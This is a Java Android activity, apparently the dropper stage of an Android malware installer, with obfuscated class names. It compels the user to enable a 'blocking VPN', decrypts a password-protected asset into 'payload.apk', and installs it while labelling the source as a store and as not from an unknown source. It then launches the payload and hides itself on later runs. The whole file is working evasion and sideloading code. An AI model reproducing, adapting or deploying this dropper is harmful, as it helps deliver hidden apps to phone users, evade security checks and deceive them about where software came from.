package com.onerule.task;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;

import androidx.core.content.FileProvider;

import net.lingala.zip4j.ZipFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class A4450c4b785 extends Activity {

    private static final String ASSET_NAME  = "module";
    private static final String INNER_NAME  = "payload.apk";

    private static final int REQ_VPN             = 1000;
    private static final int REQ_UNKNOWN_SOURCES = 1001;

    private static final long PERM_POLL_MS   = 400;
    private static final long LAUNCH_POLL_MS = 300;
    private static final long LAUNCH_TIMEOUT = 15_000;
    /** How often to poll ConnectivityManager to check VPN is still active. */
    private static final long VPN_MONITOR_MS = 600;

    private TextView status;
    private Button   btn;
    private final Handler ui = new Handler(Looper.getMainLooper());
    private Uri incomingApkUri;

    /**
     * True once the user has granted VPN permission (so we know the system dialog
     * was answered). The Install button also requires isVpnActive() to be true at
     * the moment of the click.
     */
    private boolean vpnPermissionGranted         = false;
    private boolean awaitingUnknownSourcesGrant   = false;

    /** True after the payload launches successfully — used to skip VPN re-checks. */
    private boolean installComplete = false;

    // ── VPN monitor ────────────────────────────────────────────────────────────

    /**
     * Periodic runnable that keeps the Install button in sync with live VPN status.
     *
     * Uses V4450c4b785.isRunning(), which queries this installer's service
     * instance directly. A different VPN running on the device is not enough.
     *
     * Rules:
     *   - Button ENABLED  iff VPN is currently live.
     *   - If VPN drops after being granted, lock the button and re-request.
     *   - Monitor stops once installation is complete (installComplete == true).
     */
    private final Runnable vpnMonitor = new Runnable() {
        @Override public void run() {
            if (installComplete) return;

            boolean live = isVpnLive();

            if (live) {
                if (vpnPermissionGranted && !btn.isEnabled()) {
                    btn.setEnabled(true);
                    status.setText("Ready \u2014 tap Install to begin.");
                }
            } else {
                // VPN dropped (user killed it in Settings or service crashed).
                if (vpnPermissionGranted) {
                    vpnPermissionGranted = false;
                    btn.setEnabled(false);
                    status.setText("VPN was disabled \u2014 please re-grant to continue.");
                    requestVpnPermission();
                }
            }

            ui.postDelayed(this, VPN_MONITOR_MS);
        }
    };

    /**
     * Returns true if our blocking VPN is currently live.
     *
     * Primary check  — V4450c4b785.isRunning(): queries the static service
     *   instance directly.  This is instantaneous and works on all Android
     *   versions / OEMs regardless of ConnectivityManager quirks.
     *
     */
    private boolean isVpnLive() {
        return V4450c4b785.isRunning();
    }

    // ── Activity lifecycle ─────────────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        incomingApkUri = extractIncomingApkUri(getIntent());

        // Already installed → redirect instantly, no UI shown at all.
        if (incomingApkUri == null && isPayloadInstalled()) {
            doImmediateRedirect();
            return;
        }

        setContentView(R.layout.activity_main);
        status = findViewById(R.id.status);
        btn    = findViewById(R.id.btnInstall);
        btn.setOnClickListener(v -> onInstallClicked());

        // Lock the Install button and demand VPN permission before anything else.
        btn.setEnabled(false);
        requestVpnPermission();

        // Start the monitor — it will enable the button once VPN is confirmed live.
        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
    }

    @Override
    protected void onDestroy() {
        // Remove all pending monitor callbacks to avoid leaks.
        ui.removeCallbacks(vpnMonitor);
        super.onDestroy();
    }

    @Override
    protected void onResume() {
        super.onResume();

        // With fire-and-forget package installation, resume is the completion
        // signal: once the package is visible, launch it and close this installer.
        if (incomingApkUri == null && isPayloadInstalled() && !installComplete) {
            doImmediateRedirect();
            return;
        }

        if (awaitingUnknownSourcesGrant) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                    || getPackageManager().canRequestPackageInstalls()) {
                awaitingUnknownSourcesGrant = false;
                new Thread(this::dropAndInstall).start();
            }
        }

    }

    // ── VPN permission gate ────────────────────────────────────────────────────

    private void requestVpnPermission() {
        status.setText("Grant the VPN permission to continue\u2026");
        Intent vpnIntent;
        try {
            vpnIntent = VpnService.prepare(this);
        } catch (Exception e) {
            vpnIntent = null;  // Some OEMs throw; treat as already-granted.
        }

        if (vpnIntent == null) {
            // Already granted from a previous session — start the service directly.
            onVpnGranted();
        } else {
            startActivityForResult(vpnIntent, REQ_VPN);
        }
    }

    /**
     * Called once the user grants VPN permission.
     *
     * Two cases:
     *   A) Service already running (re-open after failed install, or permission
     *      was granted in a previous session and the service never stopped):
     *      Enable the button immediately — no need to wait.
     *   B) Service not yet running:
     *      Start it, show "Starting VPN…" and let the monitor enable the button
     *      once V4450c4b785.isRunning() becomes true (typically < 200 ms).
     */
    private void onVpnGranted() {
        vpnPermissionGranted = true;

        if (V4450c4b785.isRunning()) {
            // Already live — skip the "Starting…" phase entirely.
            btn.setEnabled(true);
            status.setText("Ready \u2014 tap Install to begin.");
            return;
        }

        try {
            startService(new Intent(this, V4450c4b785.class));
        } catch (Exception e) {
            android.util.Log.w(V4450c4b785.TAG,
                    "Could not start V4450c4b785: " + e.getMessage());
        }
        // The monitor will enable the button as soon as isRunning() becomes true.
        status.setText("Starting VPN\u2026 please wait.");
    }

    /**
     * Stops the blocking VPN.
     * Called ONLY after the payload launches successfully.
     */
    private void stopVpn() {
        installComplete = true;
        ui.removeCallbacks(vpnMonitor);
        V4450c4b785.stop(this);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_VPN) {
            if (resultCode == RESULT_OK) {
                onVpnGranted();
            } else {
                // Denied — re-show after a short delay. Cannot proceed without it.
                vpnPermissionGranted = false;
                status.setText("VPN permission is required. Please allow it.");
                ui.postDelayed(this::requestVpnPermission, 900);
            }
        } else if (requestCode == REQ_UNKNOWN_SOURCES) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    && getPackageManager().canRequestPackageInstalls()) {
                awaitingUnknownSourcesGrant = false;
                new Thread(this::dropAndInstall).start();
            } else {
                runOnUiThread(() -> status.setText("Permission denied \u2014 cannot install."));
            }
        }
    }

    // ── Install flow ───────────────────────────────────────────────────────────

    private void onInstallClicked() {
        // Hard gate: verify VPN is actually live at click time, not just on paper.
        if (!vpnPermissionGranted || !isVpnLive()) {
            btn.setEnabled(false);
            vpnPermissionGranted = false;
            status.setText("VPN must be active to install. Re-requesting\u2026");
            requestVpnPermission();
            return;
        }
        if (isPayloadInstalled()) {
            doImmediateRedirect();
            return;
        }
        startInstall();
    }

    private void startInstall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !getPackageManager().canRequestPackageInstalls()) {
            status.setText("Allow install from this source \u2014 install starts automatically.");
            awaitingUnknownSourcesGrant = true;
            startPermissionPoll();
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, REQ_UNKNOWN_SOURCES);
            return;
        }
        new Thread(this::dropAndInstall).start();
    }

    private void startPermissionPoll() {
        ui.postDelayed(new Runnable() {
            @Override public void run() {
                if (!awaitingUnknownSourcesGrant) return;
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                        || getPackageManager().canRequestPackageInstalls()) {
                    awaitingUnknownSourcesGrant = false;
                    new Thread(A4450c4b785.this::dropAndInstall).start();
                    return;
                }
                ui.postDelayed(this, PERM_POLL_MS);
            }
        }, PERM_POLL_MS);
    }

    // ── Payload queries ────────────────────────────────────────────────────────

    /**
     * Accepts APKs handed to this activity by another app or a file browser.
     * The URI grant is consumed only when the user presses Install and the
     * same VPN gate used for the embedded payload has passed.
     */
    private Uri extractIncomingApkUri(Intent intent) {
        if (intent == null) return null;
        String action = intent.getAction();
        if (!Intent.ACTION_VIEW.equals(action)
                && !Intent.ACTION_INSTALL_PACKAGE.equals(action)) {
            return null;
        }
        Uri data = intent.getData();
        if (data == null) return null;
        String type = intent.getType();
        return type == null
                || "application/vnd.android.package-archive".equalsIgnoreCase(type)
                ? data
                : null;
    }

    private boolean isPayloadInstalled() {
        String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg == null || pkg.isEmpty()) return false;
        try {
            getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private Intent resolvePayloadLaunchIntent(String pkg) {
        PackageManager pm = getPackageManager();
        Intent launch = pm.getLaunchIntentForPackage(pkg);
        if (launch != null) return launch;
        Intent probe = new Intent(Intent.ACTION_MAIN);
        probe.addCategory(Intent.CATEGORY_LAUNCHER);
        probe.setPackage(pkg);
        java.util.List<android.content.pm.ResolveInfo> ris =
                pm.queryIntentActivities(probe, 0);
        if (ris != null && !ris.isEmpty()) {
            android.content.pm.ActivityInfo ai = ris.get(0).activityInfo;
            Intent direct = new Intent(Intent.ACTION_MAIN);
            direct.addCategory(Intent.CATEGORY_LAUNCHER);
            direct.setClassName(ai.packageName, ai.name);
            return direct;
        }
        return null;
    }

    // ── Launch helpers ─────────────────────────────────────────────────────────

    /**
     * Immediate redirect for the "already installed" case.
     *
     * Called from onCreate / onResume when the module is already on-device.
     * Does NOT show any UI — just launches the module app and calls finish().
     * No polling needed because the package is already fully installed.
     */
    private void doImmediateRedirect() {
        installComplete = true;
        ui.removeCallbacks(vpnMonitor);
        V4450c4b785.stop(this);

        final String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg != null && !pkg.isEmpty()) {
            Intent launch = resolvePayloadLaunchIntent(pkg);
            if (launch != null) {
                try { startActivity(launch); } catch (Exception ignored) {}
            }
        }
        finish();
    }

    /**
     * Post-install launch: polls until the freshly-installed package is
     * queryable (PackageManager can lag briefly after session commit), then
     * launches the module app, drops the VPN, and closes the installer.
     */
    private void launchPayloadAndExit() {
        final String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg == null || pkg.isEmpty()) {
            if (status != null) status.setText("Installed.");
            return;
        }
        final long deadline = System.currentTimeMillis() + LAUNCH_TIMEOUT;
        ui.post(new Runnable() {
            @Override public void run() {
                Intent launch = resolvePayloadLaunchIntent(pkg);
                if (launch != null) {
                    try {
                        startActivity(launch);
                        stopVpn();
                        ui.postDelayed(A4450c4b785.this::finish, 150);
                    } catch (Exception e) {
                        if (status != null) status.setText("Launch failed: " + e.getMessage());
                    }
                    return;
                }
                if (System.currentTimeMillis() < deadline) {
                    ui.postDelayed(this, LAUNCH_POLL_MS);
                } else {
                    if (status != null)
                        status.setText("Installed \u2014 open " + pkg + " manually.");
                }
            }
        });
    }

    // ── Decryption + installation ──────────────────────────────────────────────

    private void dropAndInstall() {
        try {
            if (incomingApkUri == null && isPayloadInstalled()) {
                runOnUiThread(() -> {
                    installComplete = true;
                    status.setText("App installed, kindly wait for it to launch\u2026");
                    btn.setEnabled(false);
                    launchPayloadAndExit();
                });
                return;
            }

            runOnUiThread(() -> status.setText(
                    incomingApkUri == null ? "Decrypting module \u2026" : "Preparing APK \u2026"));

            File workDir = new File(getCacheDir(), "drop");
            if (!workDir.exists()) workDir.mkdirs();
            File apk = new File(workDir, incomingApkUri == null ? INNER_NAME : "incoming.apk");
            if (incomingApkUri == null) {
                File leftover = new File(workDir, INNER_NAME);
                if (leftover.exists()) leftover.delete();

                File encZip = new File(workDir, "m.zip");
                try (InputStream in = getAssets().open(ASSET_NAME);
                     OutputStream out = new FileOutputStream(encZip)) {
                    byte[] buf = new byte[64 * 1024]; int n;
                    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
                }

                ZipFile zf = new ZipFile(encZip, BuildConfig.MODULE_KEY.toCharArray());
                zf.extractFile(INNER_NAME, workDir.getAbsolutePath());
                encZip.delete();
            } else {
                try (InputStream in = getContentResolver().openInputStream(incomingApkUri);
                     OutputStream out = new FileOutputStream(apk)) {
                    if (in == null) throw new RuntimeException("Unable to read selected APK");
                    byte[] buf = new byte[64 * 1024]; int n;
                    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
                }
            }

            if (!apk.exists() || apk.length() == 0) {
                throw new RuntimeException(incomingApkUri == null
                        ? "Decrypted payload missing"
                        : "Selected APK missing");
            }

            runOnUiThread(() -> {
                status.setText("Installing \u2026");
                try {
                    openPackageInstaller(apk);
                } catch (Exception e) {
                    status.setText("Install failed: " + e.getMessage());
                }
            });
        } catch (Exception e) {
            // Failed — VPN intentionally left running.
            runOnUiThread(() -> status.setText("Install failed: " + e.getMessage()));
        }
    }

    private void openPackageInstaller(File apk) throws Exception {
        /*
         * Android 13+ has an explicit package-source field. Using a
         * PackageInstaller session is the supported way to mark the APK as
         * coming from a store; the caller's package is recorded as the
         * installer-of-record automatically.
         */
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            installFromStoreSession(apk);
            return;
        }

        // Older Android releases do not expose PACKAGE_SOURCE_STORE. Keep the
        // normal package-installer activity flow and identify this package as
        // the installer through the supported intent metadata.
        openPackageInstallerActivity(apk);
    }

    private void installFromStoreSession(File apk) throws Exception {
        PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        params.setSize(apk.length());
        if (incomingApkUri == null
                && BuildConfig.PAYLOAD_PACKAGE != null
                && !BuildConfig.PAYLOAD_PACKAGE.isEmpty()) {
            params.setAppPackageName(BuildConfig.PAYLOAD_PACKAGE);
        }
        params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE);

        int sessionId = -1;
        PackageInstaller.Session session = null;
        try {
            sessionId = packageInstaller.createSession(params);
            session = packageInstaller.openSession(sessionId);

            try (InputStream input = new FileInputStream(apk);
                 OutputStream output = session.openWrite("base.apk", 0, apk.length())) {
                byte[] buffer = new byte[64 * 1024];
                int count;
                while ((count = input.read(buffer)) != -1) {
                    output.write(buffer, 0, count);
                }
                session.fsync(output);
            }

            /*
             * PackageInstaller requires an IntentSender for completion
             * delivery. This targets the already-declared VPN service rather
             * than returning an activity result; the installer observes the
             * installed payload when its activity resumes.
             */
            Intent statusIntent = new Intent(this, V4450c4b785.class)
                    .setAction(getPackageName() + ".INSTALL_STATUS");
            int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                pendingFlags |= PendingIntent.FLAG_MUTABLE;
            }
            PendingIntent statusPendingIntent = PendingIntent.getService(
                    this, sessionId, statusIntent, pendingFlags);
            session.commit(statusPendingIntent.getIntentSender());
        } catch (Exception e) {
            if (sessionId >= 0) {
                try { packageInstaller.abandonSession(sessionId); } catch (Exception ignored) {}
            }
            throw e;
        } finally {
            if (session != null) session.close();
        }
    }

    private void openPackageInstallerActivity(File apk) throws Exception {
        Uri apkUri = FileProvider.getUriForFile(
                this,
                getPackageName() + ".fileprovider",
                apk);

        Intent installIntent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
        installIntent.setDataAndType(apkUri, "application/vnd.android.package-archive");
        // Start the system package installer in its own task/document. Do not
        // request a result callback; onResume() observes successful completion.
        installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_NEW_DOCUMENT
                | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        installIntent.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
        installIntent.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, getPackageName());
        installIntent.putExtra(Intent.EXTRA_ORIGINATING_URI, apkUri);
        installIntent.putExtra(Intent.EXTRA_REFERRER,
                Uri.parse("android-app:" + getPackageName()));
        installIntent.setClipData(ClipData.newRawUri("payload.apk", apkUri));

        startActivity(installIntent);
    }

}
